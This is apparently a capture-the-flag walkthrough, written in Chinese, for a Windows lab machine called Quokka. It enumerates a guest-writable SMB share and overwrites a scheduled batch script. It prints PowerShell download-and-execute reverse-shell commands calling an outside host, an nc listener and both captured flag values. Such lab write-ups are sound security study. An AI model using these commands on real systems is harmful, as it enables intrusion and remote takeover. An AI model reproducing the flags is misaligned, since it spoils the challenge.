# Quokka

2025.03.16 https://thehackerslabs.com/quokka/

[video]()

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

先枚举下 smb 共享：

```
smbmap -u guest -H 192.168.5.40
```

发现 Compartido 并有读写权限，登陆查看：

```
smbclient -N //192.168.5.40/Compartido -U guest
prompt
recurse on
```

发现了一个 bat 维护脚本 \Proyectos\Quokka\Código\mantenimiento.bat ：

```bat
@echo off
:: Mantenimiento del sistema de copias de seguridad
:: Este script es ejecutado cada minuto

REM Pista: Tal vez haya algo más aquí...

:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.36:8000/shell.ps1')"

:: Fin del script
exit
```

注释中说这个脚本每 1 分钟执行一次，对这个共享目录 guest 用户有修改权限，看看能否得到反弹的 shell:

```bat
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.5.3/shell/5.3/8888.ps1')"
```

这里下载 kali 上 web 服务中的 ps 反弹 shell 脚本 这里使用 nishang 中的 Invoke-PowerShellTcp.ps1。

先在 kali 上创建监听 `rlwrap -cAr nc -lvnp 8888` ，覆盖共享中的文件，等待 1 分钟，得到了反弹的 shell。

反弹的 shell 是 administrator：

```
PS C:\users> whoami
win-vru3gg3dplj\administrador
```

直接拿到 root flag：

```
PS C:\users\administrador\Desktop> gc admin.txt
j9eCpd89VGOscar4nQp8e842mUOb8U
```

寻找另外的 flag：

```
PS C:\users> gci -r c:\users\ *.txt -ea 0
```

```
PS C:\users> gc C:\users\0mar\Desktop\user.txt
9OWiub9aDwcULNxs4w80W63Jl
```

最后在看一下这个每分钟执行的计划任务：

```
schtasks /query  /fo list /v /tn Quokka

Compartido
```
